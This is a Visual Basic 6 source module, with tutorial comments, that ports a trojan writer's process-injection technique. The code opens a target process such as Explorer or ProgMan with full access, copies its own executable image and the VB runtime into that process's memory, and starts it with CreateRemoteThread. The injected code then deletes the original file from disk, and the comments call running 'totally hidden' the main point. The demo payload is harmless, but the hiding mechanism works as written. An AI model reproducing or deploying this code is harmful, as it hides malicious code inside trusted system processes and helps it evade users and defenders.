Attribute VB_Name = "InjectModule"
' Updated May 1st !!!

' PLEASE READ THESE COMMENTS AS THEY ARE *VERY* IMPORTANT
' Hijacking, or Injection, is a way to execute a piece of code from an executable file into the memory of another program
' This allows us for example to run some code into memory, close our original executable, and then delete it
' This has been done in ASM, Delphi and C++ numerous times, but I've never seen it done in VB.
' I took this change to port similar code in ASM and Delphi from Aphex, a great Trojan Writer, and write his code in VB
' I'll explain the code line-by-line, and have included the ASM and Delphi version of the code as well
' This code can now infect most Windows Applications, including Explorer.exe, which means your code will run on any NT-based system totally hidden
' I am now trying to find out what the hidden function in 9x is, since I know there is a createremotethead in Win9x, and there are equivalent
' Read and Write Process Memory APIs.
' Also, please note I did not port this to write a trojan, I think it's a great excercise of programming and has made legitmate uses

' UPDATED:
'   - I now show you how to copy some data between your original process and your hijacked one.
'   - How to delete your original program and keep running the code inside (the main point of this code)
'   - How to display whole user interfaces and subclass them using your hijacked process (Only an API form for now...but I'll make it better)
'   - How to inject in Explorer.exe

' ONE ADDITIONAL THING:
' You will NEED the CompilerControl.dll in order to set the base address of the EXE.
' If you do not do this, the code WILL NOT WORK AT ALL
' Open the CompileController.vbp project, and compile the dll in your VB directory.
' Then, open the InstallCompilecontroller.vbp and execute it.
' Now go in VB's add-in manager, and add the CompileController add-in and make it load on startup.
' Finally, open Inject.vbp. Go to file, hook compilation.
' Now go to file/make exe. Click on options, and select P-code.
' Press ok, and the compiler controller window will appear. You will see /BASE:0x400000. Please replace it with: /BASE:0x13140000
' Press finish compilation. I will explain more on this later.
Option Explicit
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function VirtualAllocEx Lib "kernel32" (ByVal ProcessHandle As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Public Declare Function VirtualFreeEx Lib "kernel32" (ByVal ProcessHandle As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Public Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As Any, ByVal lpWindowName As Any) As Long
Public Declare Function CreateRemoteThread Lib "kernel32" (ByVal ProcessHandle As Long, lpThreadAttributes As Long, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpthreadid As Long) As Long
Public Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpthreadid As Long) As Long
Public Declare Function GetModuleHandleA Lib "kernel32" (ByVal ModName As Any) As Long
Public Declare Function WriteProcessMemory Lib "kernel32" (ByVal ProcessHandle As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long
Public Declare Function MessageBox Lib "user32" Alias "MessageBoxA" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
Public Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Public Declare Function CreateEvent Lib "kernel32" Alias "CreateEventA" (ByVal lpEventAttributes As Long, ByVal bManualReset As Long, ByVal bInitialState As Long, ByVal lpname As String) As Long
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function GetMessage Lib "user32" Alias "GetMessageA" (lpMsg As Msg, ByVal hwnd As Long, ByVal wMsgFilterMin As Long, ByVal wMsgFilterMax As Long) As Long
Public Declare Function TranslateMessage Lib "user32" (lpMsg As Msg) As Long
Public Declare Function DispatchMessage Lib "user32" Alias "DispatchMessageA" (lpMsg As Msg) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function LoadCursor Lib "user32" Alias "LoadCursorA" (ByVal hInstance As Long, ByVal lpCursorName As Any) As Long
Public Declare Function LoadIcon Lib "user32" Alias "LoadIconA" (ByVal hInstance As Long, ByVal lpIconName As String) As Long
Public Declare Function CreateFontIndirect Lib "gdi32" Alias "CreateFontIndirectA" (lpLogFont As LOGFONT) As Long
Public Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal hMenu As Long, ByVal hInstance As Long, lpParam As Any) As Long
Public Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Function RegisterClass Lib "user32" Alias "RegisterClassA" (Class As WNDCLASS) As Long
Public Declare Function UnregisterClass Lib "user32" Alias "UnregisterClassA" (ByVal lpClassName As String, ByVal hInstance As Long) As Long
Public Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Public Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Public Declare Function GetFileSize Lib "kernel32" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long
Public Declare Function GetLastError Lib "kernel32" () As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal time As Long)
Public Declare Sub PostQuitMessage Lib "user32" (ByVal nExitCode As Long)
Public Declare Sub ExitThread Lib "kernel32" (ByVal dwExitCode As Long)
Public Declare Sub ExitProcess Lib "kernel32" (ByVal dwExitCode As Long)
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
 
Public Type POINTAPI
    x As Long
    y As Long
End Type
Public Type Msg
    hwnd As Long
    message As Long
    wParam As Long
    lParam As Long
    time As Long
    pt As POINTAPI
End Type
Public Type WNDCLASS
    style As Long
    lpfnwndproc As Long
    cbClsextra As Long
    cbWndExtra2 As Long
    hInstance As Long
    hIcon As Long
    hCursor As Long
    hbrBackground As Long
    lpszMenuName As String
    lpszClassName As String
End Type
Public Type LOGFONT
    lfHeight As Long
    lfWidth As Long
    lfEscapement As Long
    lfOrientation As Long
    lfWeight As Long
    lfItalic As Byte
    lfUnderline As Byte
    lfStrikeOut As Byte
    lfCharSet As Byte
    lfOutPrecision As Byte
    lfClipPrecision As Byte
    lfQuality As Byte
    lfPitchAndFamily As Byte
    lfFaceName(32) As Byte 'or LF_FACESIZE instead of 32
End Type

Public Const GWL_WNDPROC = (-4)
Public Const WS_VISIBLE = &H10000000
Public Const WS_CHILD = &H40000000
Public Const WS_THICKFRAME = &H40000
Public Const WS_TABSTOP = &H10000
Public Const WS_BORDER = &H800000
Public Const WS_OVERLAPPED = &H0&
Public Const WS_CAPTION = &HC00000 ' WS_BORDER Or WS_DLGFRAME
Public Const WS_SYSMENU = &H80000
Public Const WS_MINIMIZEBOX = &H20000
Public Const WS_MAXIMIZEBOX = &H10000
Public Const WS_OVERLAPPEDWINDOW = (WS_OVERLAPPED Or WS_CAPTION Or WS_SYSMENU Or WS_THICKFRAME Or WS_MINIMIZEBOX Or WS_MAXIMIZEBOX)
Public Const WS_EX_CLIENTEDGE = &H200&
Public Const WS_EX_WINDOWEDGE = &H100&
Public Const WS_EX_STATICEDGE = &H20000
Public Const WM_SETTEXT = &HC
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_VSCROLL = &H115 'vertical scroll
Public Const WM_KEYUP = &H101 'emulate the end of _KeyPress or _Change
Public Const WM_LBUTTONUP = &H202 'emulate the end of _Click
Public Const WM_LBUTTONDOWN = &H201 'emulate the beginning of _Click
Public Const WM_SHOWWINDOW = &H18
Public Const WM_DESTROY = &H2 'aka Form_Unload
Public Const WM_SETFONT = &H30 'used in building text font for the new controls
Public Const WM_COPY = &H301
Public Const WM_PASTE = &H302
Public Const INVALID_HANDLE_VALUE = -1
Public Const GENERIC_WRITE = &H40000000
Public Const GENERIC_READ = &H80000000
Public Const GENERIC_ALL = &H10000000
Public Const FILE_ATTRIBUTE_NORMAL = &H80
Public Const CREATE_NEW = 1
Public Const CREATE_ALWAYS = 2
Public Const OPEN_EXISTING = 3
Public Const OPEN_ALWAYS = 4
Public Const FILE_SHARE_READ = &H1
Public Const FILE_SHARE_WRITE = &H2
Public Const TRUNCATE_EXISTING = 5
Public Const COLOR_WINDOW = 5
Public Const IDC_ARROW = 32512&
Public Const IDI_APPLICATION = 32512&
Public Const SW_SHOWNORMAL = 1
Public Const CW_USEDEFAULT = &H80000000
Public Const gClassName = "CustomClName"
Public Const gAppName = "Application caption"
Public ghWnd As Long

Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const MEM_RELEASE = &H8000
Const PAGE_EXECUTE_READWRITE = &H40&
Const IMAGE_NUMBEROF_DIRECTIRY_ENRIES = 16
Const STANDARD_RIGHTS_REQUIRED = &HF0000
Const SYNCHRONIZE = &H100000
Const PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED Or SYNCHRONIZE Or &HFFF)

Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDataStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    Characteristics As Integer
End Type

Type IMAGE_OPTIONAL_HEADER32
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitalizedData As Long
    SizeOfUninitalizedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    Reserved1 As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    Subsystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaerFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(IMAGE_NUMBEROF_DIRECTIRY_ENRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Type test
    szTarget As String
End Type

Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_onvo As Integer
    e_res(3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(9) As Integer
    e_lfanew As Long
End Type
Const szTarget As String = "ProgMan"
Global szFileName As String * 261
Public Sub Main()
' Sub that will start when the program is run
Dim PID As Long, ProcessHandle As Long
Dim Size As Long, BytesWritten As Long, TID As Long, Module As Long, NewModule As Long
Dim PImageOptionalHeader As IMAGE_OPTIONAL_HEADER32, PImageDosHeader As IMAGE_DOS_HEADER, TImageFileHeader As IMAGE_FILE_HEADER
Dim ExeVariable As Long

' Get the EXE name
GetModuleFileName 0, szFileName, 261

' Get the PID of the program. Note that it must be running in memory (open it)
GetWindowThreadProcessId FindWindow(szTarget, 0&), PID

' Open the process and give us full access, we need this to hijack it
ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, PID)

' Get the memory location of where our code starts in memory, this will correspond to the /BASE: switch that you put in the linker options using compile controller
Module = GetModuleHandleA(vbNullString)

' Load the code's header into the DosHeader Type
CopyMemory PImageDosHeader, ByVal Module, Len(PImageDosHeader)

' e_lfanew is the starting address of the PE Header in memory. Add this value to the length of the fileheader as well as to the length of the optional header
' These headers are the founding blocks of any executable file, wether in memory or on disk.
CopyMemory PImageOptionalHeader, ByVal (Module + PImageDosHeader.e_lfanew + 4 + Len(TImageFileHeader)), Len(PImageOptionalHeader)

' After adding all those lengths, we will get the final size of the executable in memory, this is usually a bit more then the size on disk
Size = PImageOptionalHeader.SizeOfImage

' Just to make sure, free the memory in the program at the location of our exe
VirtualFreeEx ProcessHandle, Module, 0, MEM_RELEASE

' Allocate the size of our exe in memory of the program, at the location of where our exe is in memory
NewModule = VirtualAllocEx(ProcessHandle, Module, Size, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)

' Copy our exe into program's memory
WriteProcessMemory ProcessHandle, ByVal NewModule, ByVal Module, Size, BytesWritten

' Copy the EXE name
ExeVariable = VirtualAllocEx(ProcessHandle, 0, 261, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
WriteProcessMemory ProcessHandle, ByVal ExeVariable, ByVal szFileName, 261, BytesWritten

' Copy VB Runtime to EXE memory (same code as to copy our EXE, so I won't comment it again.
Dim VBMod As Long, VBSize As Long, VBNewMod As Long
VBMod = GetModuleHandleA("msvbvm60.dll")
CopyMemory PImageDosHeader, ByVal VBMod, Len(PImageDosHeader)
CopyMemory PImageOptionalHeader, ByVal (VBMod + PImageDosHeader.e_lfanew + 4 + Len(TImageFileHeader)), Len(PImageOptionalHeader)
VBSize = PImageOptionalHeader.SizeOfImage
VBNewMod = VirtualAllocEx(ProcessHandle, VBMod, VBSize, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
WriteProcessMemory ProcessHandle, ByVal VBNewMod, ByVal VBMod, VBSize, BytesWritten

' Create our remote thread
CreateRemoteThread ProcessHandle, ByVal 0, 0, ByVal GetAdd(AddressOf HijackModule), ByVal ExeVariable, 0, TID
ExitProcess 0
End Sub
Private Function GetAdd(Entrypoint As Long) As Long
GetAdd = Entrypoint
End Function
Private Function MainModule(Stuff As Long) As String
'Declare our variables
Dim BytesWritten As Long, wc As WNDCLASS, szExename As String * 261
Dim lngFileHandle As Long, lngLength As Long, Exec As String, lBytesRead As Long, szTestName As String

' Get the EXE name
ReadProcessMemory OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId), ByVal Stuff, ByVal szExename, 261, ByVal BytesWritten

'Register our window class
With wc
    .lpfnwndproc = GetAdd(AddressOf WndProc)  ' I don't know how to subclass in a remote thread yet, so I'm telling windows to use the default subclasser
    .hbrBackground = 5 ' Default color for a window
    .lpszClassName = "HijackedClass" ' Name of our class
End With
RegisterClass wc ' Register it

' Create our window (using WS_EX_OVERLAPPED, at 100x100, measuring 340x240, with the hInstance of our hijacked app) and then show it
ShowWindow CreateWindowEx(0, "HijackedClass", "Hijacked Form", WS_OVERLAPPEDWINDOW, 100, 100, 340, 240, 0, 0, GetModuleHandleA(0&), ByVal 0&), 1

'It worked!
MessageBox 0, "Hijack Module Working", "Sucess!", 0

' Deleted!
DeleteFile szExename

' Loop
Do: DoEvents: Sleep 100: Loop
End Function
Public Function HijackModule(ByVal Stuff As Long) As Long ' Code that will run in the hijacked program - CANNOT USE MOST VB INTRISTIC FUNCTIONS -
' Call our module with full access to VB functions, any other code here needs to be extremly basic (not even left/mid etc)
MainModule Stuff
End Function
Public Function WndProc(ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
If wMsg = &H201 Then MessageBox 0, "You clicked me", "Subclasser is working", 0
WndProc = DefWindowProc(hwnd, wMsg, wParam, lParam)
End Function

